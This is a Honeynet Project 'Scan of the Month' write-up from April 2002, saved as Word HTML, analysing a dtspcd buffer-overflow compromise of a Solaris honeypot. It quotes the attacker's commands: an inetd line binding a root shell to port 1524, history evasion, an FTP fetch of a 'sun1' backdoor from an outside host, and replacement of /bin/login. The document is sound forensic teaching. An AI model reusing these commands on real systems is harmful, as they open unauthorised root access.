<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns="http://www.w3.org/TR/REC-html40"><head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="ProgId" content="Word.Document">
<meta name="Generator" content="Microsoft Word 9">
<meta name="Originator" content="Microsoft Word 9">
<link rel="File-List" href="project.honeynet.org_files/filelist.xml">
<link rel="Edit-Time-Data" href="project.honeynet.org_files/editdata.html">
<!--[if !mso]>
<style>
v\:* {behavior:url(#default#VML);}
o\:* {behavior:url(#default#VML);}
w\:* {behavior:url(#default#VML);}
.shape {behavior:url(#default#VML);}
</style>
<![endif]-->

<title></title><!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>Yoann Le Corvic</o:Author>
  <o:LastAuthor>Yoann Le Corvic</o:LastAuthor>
  <o:Revision>4</o:Revision>
  <o:TotalTime>1101</o:TotalTime>
  <o:Created>2002-04-08T06:20:00Z</o:Created>
  <o:LastSaved>2002-04-08T13:08:00Z</o:LastSaved>
  <o:Pages>4</o:Pages>
  <o:Words>667</o:Words>
  <o:Characters>3805</o:Characters>
  <o:Company>Linkvest Group</o:Company>
  <o:Lines>31</o:Lines>
  <o:Paragraphs>7</o:Paragraphs>
  <o:CharactersWithSpaces>4672</o:CharactersWithSpaces>
  <o:Version>9.3821</o:Version>
 </o:DocumentProperties>
</xml><![endif]-->
<style>
<!--
 /* Font Definitions */
@font-face
	{font-family:Helvetica;
	panose-1:2 11 6 4 2 2 2 2 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:536902279 -2147483648 8 0 511 0;}
@font-face
	{font-family:"Arial Unicode MS";
	panose-1:2 11 6 4 2 2 2 2 2 4;
	mso-font-charset:128;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:-1 -369098753 63 0 4129023 0;}
@font-face
	{font-family:Impact;
	panose-1:2 11 8 6 3 9 2 5 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:"\@Arial Unicode MS";
	mso-font-charset:128;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:-1 -369098753 63 0 4129023 0;}
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:Helvetica;
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";
	color:windowtext;
	mso-ansi-language:FR;}
h1
	{mso-style-next:Normal;
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:1;
	font-size:22.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Helvetica;
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";
	color:windowtext;
	mso-font-kerning:0pt;
	mso-ansi-language:FR;
	font-weight:bold;}
h2
	{mso-style-next:Normal;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	text-indent:-18.0pt;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:2;
	mso-list:l0 level1 lfo2;
	tab-stops:list 18.0pt;
	font-size:20.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Helvetica;
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";
	color:windowtext;
	mso-ansi-language:EN-US;
	font-weight:bold;}
h3
	{mso-style-next:Normal;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:3;
	font-size:12.0pt;
	font-family:Helvetica;
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";
	color:windowtext;
	mso-ansi-language:FR;
	font-weight:bold;
	font-style:italic;}
h4
	{mso-style-next:Normal;
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:4;
	font-size:26.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Arial;
	mso-fareast-font-family:"Times New Roman";
	color:windowtext;
	mso-ansi-language:FR;
	font-weight:bold;}
p.MsoBodyTextIndent, li.MsoBodyTextIndent, div.MsoBodyTextIndent
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:Helvetica;
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";
	color:windowtext;
	mso-ansi-language:EN-US;}
p.MsoBodyTextIndent2, li.MsoBodyTextIndent2, div.MsoBodyTextIndent2
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:18.0pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	mso-bidi-font-size:10.0pt;
	font-family:Helvetica;
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:Arial;
	color:windowtext;
	font-weight:bold;
	font-style:italic;}
p.MsoBodyTextIndent3, li.MsoBodyTextIndent3, div.MsoBodyTextIndent3
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:18.0pt;
	mso-pagination:widow-orphan;
	font-size:10.0pt;
	font-family:Helvetica;
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Courier New";
	color:windowtext;
	mso-ansi-language:EN-US;
	font-weight:bold;
	font-style:italic;}
a:link, span.MsoHyperlink
	{color:#FF6600;
	mso-text-animation:none;
	text-decoration:none;
	text-underline:none;
	text-decoration:none;
	text-line-through:none;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;
	text-underline:single;}
p
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Arial Unicode MS";
	color:#333333;}
@page Section1
	{size:595.3pt 841.9pt;
	margin:72.0pt 90.0pt 72.0pt 90.0pt;
	mso-header-margin:35.4pt;
	mso-footer-margin:35.4pt;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
 /* List Definitions */
@list l0
	{mso-list-id:2077505263;
	mso-list-template-ids:1170918910;}
@list l0:level1
	{mso-level-style-link:"Heading 2";
	mso-level-tab-stop:18.0pt;
	mso-level-number-position:left;
	margin-left:18.0pt;
	text-indent:-18.0pt;
	font-family:Impact;}
@list l0:level2
	{mso-level-text:"%1\.%2\.";
	mso-level-tab-stop:54.0pt;
	mso-level-number-position:left;
	margin-left:39.6pt;
	text-indent:-21.6pt;
	font-family:Impact;}
@list l0:level3
	{mso-level-text:"%1\.%2\.%3\.";
	mso-level-tab-stop:90.0pt;
	mso-level-number-position:left;
	margin-left:61.2pt;
	text-indent:-25.2pt;
	font-family:Impact;}
@list l0:level4
	{mso-level-text:"%1\.%2\.%3\.%4\.";
	mso-level-tab-stop:90.0pt;
	mso-level-number-position:left;
	margin-left:86.4pt;
	text-indent:-32.4pt;}
@list l0:level5
	{mso-level-text:"%1\.%2\.%3\.%4\.%5\.";
	mso-level-tab-stop:126.0pt;
	mso-level-number-position:left;
	margin-left:111.6pt;
	text-indent:-39.6pt;}
@list l0:level6
	{mso-level-text:"%1\.%2\.%3\.%4\.%5\.%6\.";
	mso-level-tab-stop:144.0pt;
	mso-level-number-position:left;
	margin-left:136.8pt;
	text-indent:-46.8pt;}
@list l0:level7
	{mso-level-text:"%1\.%2\.%3\.%4\.%5\.%6\.%7\.";
	mso-level-tab-stop:180.0pt;
	mso-level-number-position:left;
	margin-left:162.0pt;
	text-indent:-54.0pt;}
@list l0:level8
	{mso-level-text:"%1\.%2\.%3\.%4\.%5\.%6\.%7\.%8\.";
	mso-level-tab-stop:198.0pt;
	mso-level-number-position:left;
	margin-left:187.2pt;
	text-indent:-61.2pt;}
@list l0:level9
	{mso-level-text:"%1\.%2\.%3\.%4\.%5\.%6\.%7\.%8\.%9\.";
	mso-level-tab-stop:234.0pt;
	mso-level-number-position:left;
	margin-left:216.0pt;
	text-indent:-72.0pt;}
ol
	{margin-bottom:0cm;}
ul
	{margin-bottom:0cm;}
-->
</style>
<!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="1030"/>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]--></head>

<body lang="EN-GB" link="#ff6600" vlink="purple" style="">

<div class="Section1">

<h1><span lang="EN-US" style="font-size: 10pt; font-family: Arial;"><a href="http://project.honeynet.org/"><!--[if gte vml 1]><v:shapetype
 id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t"
 path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f">
 <v:stroke joinstyle="miter"/>
 <v:formulas>
  <v:f eqn="if lineDrawn pixelLineWidth 0"/>
  <v:f eqn="sum @0 1 0"/>
  <v:f eqn="sum 0 0 @1"/>
  <v:f eqn="prod @2 1 2"/>
  <v:f eqn="prod @3 21600 pixelWidth"/>
  <v:f eqn="prod @3 21600 pixelHeight"/>
  <v:f eqn="sum @0 0 1"/>
  <v:f eqn="prod @6 1 2"/>
  <v:f eqn="prod @7 21600 pixelWidth"/>
  <v:f eqn="sum @8 21600 0"/>
  <v:f eqn="prod @7 21600 pixelHeight"/>
  <v:f eqn="sum @10 21600 0"/>
 </v:formulas>
 <v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/>
 <o:lock v:ext="edit" aspectratio="t"/>
</v:shapetype><v:shape id="_x0000_i1025" type="#_x0000_t75" alt="The Honeynet Project"
 href="http://project.honeynet.org/" style='width:107.25pt;height:25.5pt'
 o:button="t">
 <v:imagedata src="./April2002_files/image001.gif" o:href="http://project.honeynet.org/images/small.gif"/>
</v:shape><![endif]--><!--[if !vml]--><img border="0" width="143" height="34" src="project.honeynet.org_files/image001.gif" alt="The Honeynet Project" v:shapes="_x0000_i1025"><!--[endif]--></a><o:p></o:p></span></h1>

<p class="MsoNormal"><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<p class="MsoNormal" align="center" style="text-align: center;"><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<h4><span lang="EN-US" style="">Scan of the month: April
2002<o:p></o:p></span></h4>

<p class="MsoNormal" align="center" style="text-align: center;"><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<h3><span lang="EN-US" style="">Analysis of the compromise
of a Solaris box<o:p></o:p></span></h3>

<p class="MsoNormal"><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<p class="MsoNormal"><b><span lang="EN-US" style="font-size: 20pt;"><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></b></p>

<h1><span lang="EN-US" style="">Introduction<o:p></o:p></span></h1>

<p class="MsoNormal"><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<p class="MsoNormal"><span lang="EN-US" style="">The
challenge this month is to analyze the compromise of a Solaris box. The
vulnerability exploited is the <b>dtspcd </b>buffer overflow of the Common
Desktop Environment.<o:p></o:p></span></p>

<p class="MsoNormal"><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<p class="MsoNormal"><span lang="EN-US" style="">Honeypot IP
Address: <b>172.16.1.102</b><o:p></o:p></span></p>

<p class="MsoNormal"><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<p class="MsoNormal"><b><span lang="EN-US" style="font-size: 22pt;"><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></b></p>

<h1><span lang="EN-US" style="">Honeynet Questions <o:p></o:p></span></h1>

<p class="MsoNormal"><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="">1 -
What is a NOP slide, and how is this one different from the NOP slide in the
rpc.statd exploit in </span></i></b><b><i><span lang="EN-US" style="">Scan10</span></i></b><b><i><span lang="EN-US" style="">?<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span lang="EN-US" style="">The NOP
slide is a technique used to increase the chances to succeed in a buffer
overflow attack. It has been described in details in AlephOne’s article in
Phrack 51. The principle is to pad a high number of NOP (<b>No Operation</b>)
instruction (0x90) before the shell code, and pad the return address after to
overflow the buffer. <o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span lang="EN-US" style="">If the
return address points to somewhere on the list of NOPs, they will be executed,
until the shell code is reached.<o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span lang="EN-US" style="">The
difference between this NOP slide and the one used in the scan 10, is that it
is not using the standard 0x90 instruction, but rather the values:<o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><span lang="EN-US" style="">0x80
0x1c 0x40 0x11, </span></b><span lang="EN-US" style="">as
seen on the picture below.<o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span style=""><!--[if gte vml 1]><v:shape
 id="_x0000_i1026" type="#_x0000_t75" style='width:396pt;height:279pt'>
 <v:imagedata src="./April2002_files/image002.png" o:title="" croptop="9633f"
  cropbottom="10423f" cropleft="14221f" cropright="2963f"/>
</v:shape><![endif]--><!--[if !vml]--><img border="0" width="528" height="372" src="project.honeynet.org_files/image003.jpg" v:shapes="_x0000_i1026"><!--[endif]--><o:p></o:p></span></p>

<p class="MsoNormal"><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="">2 - Would snort have generated an alert for
this attack ?<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span lang="EN-US" style="">This attack happened on the 8<sup>th</sup>
January 2002, and according the the snort signature database, the signature for
this exploit has been added on the 13<sup>th</sup> March 2002. So unless the
signature has been added manually by someone with a lot of intuition, <b>snort
wouldn’t have generated any alert for this attack.<o:p></o:p></b></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="">3 – </span></i></b><b><i><span lang="EN-US" style="">In the exploit code, the command "/bin/sh sh -i" is given,
what is its purpose, and why is 'sh' shown twice?<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></i></b></p>

<p class="MsoBodyTextIndent"><span lang="EN-US">This command is used to launch a
shell in interactive mode, which can’t be killed. The reason why sh is shown
twice is that it is only possible to invoke an interactive shell from an
already launched shell. </span></p>

<p class="MsoBodyTextIndent"><span lang="EN-US">The shell is bound to use the port
normally used by <b>ingreslock (1524)</b>, that is probably why it is better to
have it run in interactive mode.</span></p>

<b><i><span style="font-size: 12pt; font-family: Helvetica;"><br clear="all" style="page-break-before: always;">
</span></i></b>

<p class="MsoBodyTextIndent2">4 - The attacker executed a variety of commands on
the hacked Solaris box. Which commands were automated by the exploit, which
commands were manual by the attacker himself?</p>

<p class="MsoBodyTextIndent" style=""><span style="">The command to create the
input file for the daemon inetd were automated:<o:p></o:p></span></p>

<p class="MsoBodyTextIndent" style=""><b><i><span style="font-size: 10pt;">bin/ksh<span style="">    </span>-c<span style=""> 
</span>echo "ingreslock stream tcp nowait root /bin/sh sh
-i"&gt;/tmp/x;<br>
/usr/sbin/inetd -s /tmp/x;<br>
sleep 10;<br>
/bin/rm -f /tmp/x<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span style="">The
following commands, the first entered on the shell bound to port 1524, were
also automated I think, as they were all sent in the same packet:<o:p></o:p></span></p>

<p class="MsoBodyTextIndent3"><span lang="EN-US">uname -a;<br>
ls -l /core /var/dt/tmp/DTSPCD.log;<br>
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;<br>
export PATH;<br>
echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print
$2}'`</span></p>

<p class="MsoBodyTextIndent" style=""><span lang="EN-US" style="">The interval between those commands is quite low, so there is a good
chance that they are automated<o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;"># unset HISTFILE<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;"># cd /tmp<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">mkdir /usr/lib<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="text-indent: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">mv /bin/login /usr/lib/libfl.k<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span lang="EN-US" style="font-size: 10pt; font-family: &quot;Courier New&quot;;"><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span lang="EN-US" style="">The FTP connexion could be manual, as well as
the installation of the backdoor.<o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">ftp<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">ftp: ioctl(TIOCGETP): Invalid argument<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">Password:a@<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;"><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">cd pub<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">binary<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">get sun1<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">bye<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">Name (64.224.118.115:root): # <o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;"># ls<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">ps_data<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">sun1<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;"># chmod 555 sun1<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;"># mv sun1 /bin/login<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="FR">#</span></i></b><span lang="FR" style="font-family: &quot;Courier New&quot;;"><o:p></o:p></span></p>

<b><i><span style="font-size: 12pt; font-family: Helvetica;"><br clear="all" style="page-break-before: always;">
</span></i></b>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span style="">5 - What is sun1, and how does it work?<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span style=""><a href="http://project.honeynet.org/scans/scan20/sol/3/April2002_files%5Csun1">Sun1</a> seems to
be a <i>login</i> backdoor to allow anybody to log in as root.<o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span style="">By replacing the existing /bin/login by this
backdoor:<o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;"># ls<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">ps_data<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;">sun1<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;"># chmod 555 sun1<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span lang="EN-US" style="font-size: 10pt;"># mv sun1 /bin/login<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span lang="EN-US" style="">The attacker can </span><span style="">then connect with a standard telnet session, the attacker can get an
easy access to the Solaris box.</span><span style="font-size: 10pt;"><o:p></o:p></span></p>

<p class="MsoBodyTextIndent2">6 - What did you learn from this exercise?</p>

<p class="MsoBodyTextIndent2"><span style="font-weight: normal; font-style: normal;">That
it was possible to use a different NOP operation than the standard one.<o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><i><span style="">7- How long did this challenge take you?<o:p></o:p></span></i></b></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span style="">First analysis: 45 Minutes<br>
Answering the question and writing document: 2:30 Hour<br>
Retrieving SUN1: 15 Minutes<o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><span lang="FR" style="">Bonus Question : 15 Minutes<o:p></o:p></span></p>

<p class="MsoNormal" style="margin-left: 18pt;"><b><span lang="FR" style="">Total 3:45.<i><br style="">
<!--[if !supportLineBreakNewLine]--><br style="">
<!--[endif]--><o:p></o:p></i></span></b></p>

<p class="MsoNormal"><b><span style="font-size: 18pt;">Bonus Question:</span></b><span style=""><br>
<b>One of the commands executed during the attack is echo "BD PID(s):
"`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` .<br>
</b></span><b><span style="font-family: Arial;">What is the purpose of this command and what does 'BD'
stand for?</span></b><span style="font-family: Arial;"> <o:p></o:p></span></p>

<p class="MsoNormal" style=""><b><span style="">Ps –fed : </span></b><span style="">list the processes running on the solaris box,<o:p></o:p></span></p>

<p class="MsoNormal" style=""><b><span style="">Grep ‘ –s /tmp/x : </span></b><span style="">filter the lines containing ‘-s /tmp/x’, which
is the inetd parameter file created at the beginning,<o:p></o:p></span></p>

<p class="MsoNormal" style=""><b><span style="">Grep –v grep :</span></b><span style=""> filters out the lines containing ‘grep’<o:p></o:p></span></p>

<p class="MsoNormal" style=""><b><span style="">Awk '{print $2}' : </span></b><span style="">Prints the second field of the output : the
PID.<o:p></o:p></span></p>

<p class="MsoNormal" style=""><span style="">So to sum up, this gets the PIDs of the
processes that contains ‘-s /tmp/x’ (as a aprameter in that case), that are not
grep.<o:p></o:p></span></p>

<p class="MsoNormal" style=""><span style="">This is basically the PID of the <b>B</b>ack<b>D</b>oor,
which is what <b>BD </b>stands for in my opinion.<o:p></o:p></span></p>

<p class="MsoNormal" style=""><span style=""><!--[if !supportEmptyParas]--> <!--[endif]--><o:p></o:p></span></p>

</div>

</body></html>